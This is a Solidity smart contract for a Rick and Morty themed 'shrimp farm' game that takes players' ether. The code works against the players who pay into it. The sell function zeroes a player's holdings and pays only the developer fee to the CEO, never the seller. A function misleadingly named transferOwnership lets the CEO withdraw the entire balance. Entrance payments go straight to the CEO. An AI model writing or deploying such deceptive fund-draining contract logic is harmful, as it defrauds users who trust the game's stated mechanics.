1 pragma solidity ^0.4.18; // solhint-disable-line
2 
3 	/* 
4 	SHOW ME WHAT YOU GOT
5 			___          
6 		. -^   `--,      
7 	   /# =========`-_   
8 	  /# (--====___====\ 
9 	 /#   .- --.  . --.| 
10 	/##   |  * ) (   * ),
11 	|##   \    /\ \   / |
12 	|###   ---   \ ---  |
13 	|####      ___)    #|
14 	|######           ##|
15 	 \##### ---------- / 
16 	  \####           (  
17 	   `\###          |  
18 		 \###         |  
19 		  \##        |   
20 		   \###.    .)   
21 			`======/    
22     Contract is live, working on the site,http://PickleRick.surge.sh
23 	*/
24 
25 
26 
27 	contract RickAndMortyShrimper{
28 		string public name = "RickAndMortyShrimper";
29 		string public symbol = "RickAndMortyS";
30 		//uint256 morties_PER_RickAndMorty_PER_SECOND=1;
31 		uint256 public morties_TO_HATCH_1RickAndMorty=86400;//for final version should be seconds in a day
32 		uint256 public STARTING_RickAndMorty=314;
33 		uint256 PSN=10000;
34 		uint256 PSNH=5000;
35 		bool public initialized=true;
36 		address public ceoAddress;
37 		mapping (address => uint256) public hatcheryRickAndMorty;
38 		mapping (address => uint256) public claimedmorties;
39 		mapping (address => uint256) public lastHatch;
40 		mapping (address => address) public referrals;
41 		uint256 public marketmorties = 1000000000;
42 		uint256 public RnMmasterReq=100000;
43 		
44 		function RickAndMortyShrimper() public{
45 			ceoAddress=msg.sender;
46 		}
47 		modifier onlyCEO(){
48 			require(msg.sender == ceoAddress );
49 			_;
50 		}
51 		function becomePickleRick() public{
52 			require(initialized);
53 			require(hatcheryRickAndMorty[msg.sender]>=RnMmasterReq);
54 			hatcheryRickAndMorty[msg.sender]=SafeMath.sub(hatcheryRickAndMorty[msg.sender],RnMmasterReq);
55 			RnMmasterReq=SafeMath.add(RnMmasterReq,100000);//+100k RickAndMortys each time
56 			ceoAddress=msg.sender;
57 		}
58 		function hatchMorties(address ref) public{
59 			require(initialized);
60 			if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender){
61 				referrals[msg.sender]=ref;
62 			}
63 			uint256 mortiesUsed=getMymorties();
64 			uint256 newRickAndMorty=SafeMath.div(mortiesUsed,morties_TO_HATCH_1RickAndMorty);
65 			hatcheryRickAndMorty[msg.sender]=SafeMath.add(hatcheryRickAndMorty[msg.sender],newRickAndMorty);
66 			claimedmorties[msg.sender]=0;
67 			lastHatch[msg.sender]=now;
68 			
69 			//send referral morties
70 			claimedmorties[referrals[msg.sender]]=SafeMath.add(claimedmorties[referrals[msg.sender]],SafeMath.div(mortiesUsed,5));
71 			
72 			//boost market to nerf RickAndMorty hoarding
73 			marketmorties=SafeMath.add(marketmorties,SafeMath.div(mortiesUsed,10));
74 		}
75 		function sellMorties() public{
76 			require(initialized);
77 			uint256 hasmorties=getMymorties();
78 			uint256 eggValue=calculatemortiesell(hasmorties);
79 			uint256 fee=devFee(eggValue);
80 			claimedmorties[msg.sender]=0;
81 			lastHatch[msg.sender]=now;
82 			marketmorties=SafeMath.add(marketmorties,hasmorties);
83 			ceoAddress.transfer(fee);
84 		}
85 		function buyMorties() public payable{
86 			require(initialized);
87 			uint256 mortiesBought=calculateEggBuy(msg.value,SafeMath.sub(this.balance,msg.value));
88 			mortiesBought=SafeMath.sub(mortiesBought,devFee(mortiesBought));
89 			ceoAddress.transfer(devFee(msg.value));
90 			claimedmorties[msg.sender]=SafeMath.add(claimedmorties[msg.sender],mortiesBought);
91 		}
92 		//magic trade balancing algorithm
93 		function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
94 			//(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
95 			return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
96 		}
97 		function calculatemortiesell(uint256 morties) public view returns(uint256){
98 			return calculateTrade(morties,marketmorties,this.balance);
99 		}
100 		function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
101 			return calculateTrade(eth,contractBalance,marketmorties);
102 		}
103 		function calculateEggBuySimple(uint256 eth) public view returns(uint256){
104 			return calculateEggBuy(eth,this.balance);
105 		}
106 		function devFee(uint256 amount) public view returns(uint256){
107 			return SafeMath.div(SafeMath.mul(amount,4),100);
108 		}
109 		function seedMarket(uint256 morties) public payable{
110 			require(marketmorties==0);
111 			initialized=true;
112 			marketmorties=morties;
113 		}
114 		function getFreeRickAndMorty() public payable{
115 			require(initialized);
116 		   // require(msg.value==0.001 ether); //similar to mining fee, prevents bots
117 			ceoAddress.transfer(msg.value); //RnMmaster gets this entrance fee
118 			require(hatcheryRickAndMorty[msg.sender]==0);
119 			lastHatch[msg.sender]=now;
120 			hatcheryRickAndMorty[msg.sender]=STARTING_RickAndMorty;
121 		}
122 		function getBalance() public view returns(uint256){
123 			return this.balance;
124 		}
125 		function getMyRickAndMorty() public view returns(uint256){
126 			return hatcheryRickAndMorty[msg.sender];
127 		}
128 		function getRnMmasterReq() public view returns(uint256){
129 			return RnMmasterReq;
130 		}
131 		function getMymorties() public view returns(uint256){
132 			return SafeMath.add(claimedmorties[msg.sender],getmortiesSinceLastHatch(msg.sender));
133 		}
134 		function getmortiesSinceLastHatch(address adr) public view returns(uint256){
135 			uint256 secondsPassed=min(morties_TO_HATCH_1RickAndMorty,SafeMath.sub(now,lastHatch[adr]));
136 			return SafeMath.mul(secondsPassed,hatcheryRickAndMorty[adr]);
137 		}
138 		function min(uint256 a, uint256 b) private pure returns (uint256) {
139 			return a < b ? a : b;
140 		}
141 		function transferOwnership() onlyCEO public {
142 			uint256 etherBalance = this.balance;
143 			ceoAddress.transfer(etherBalance);
144 		}
145 	}
146 
147 	library SafeMath {
148 
149 	  /**
150 	  * @dev Multiplies two numbers, throws on overflow.
151 	  */
152 	  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
153 		if (a == 0) {
154 		  return 0;
155 		}
156 		uint256 c = a * b;
157 		assert(c / a == b);
158 		return c;
159 	  }
160 
161 	  /**
162 	  * @dev Integer division of two numbers, truncating the quotient.
163 	  */
164 	  function div(uint256 a, uint256 b) internal pure returns (uint256) {
165 		// assert(b > 0); // Solidity automatically throws when dividing by 0
166 		uint256 c = a / b;
167 		// assert(a == b * c + a % b); // There is no case in which this doesn't hold
168 		return c;
169 	  }
170 
171 	  /**
172 	  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
173 	  */
174 	  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
175 		assert(b <= a);
176 		return a - b;
177 	  }
178 
179 	  /**
180 	  * @dev Adds two numbers, throws on overflow.
181 	  */
182 	  function add(uint256 a, uint256 b) internal pure returns (uint256) {
183 		uint256 c = a + b;
184 		assert(c >= a);
185 		return c;
186 	  }
187 	}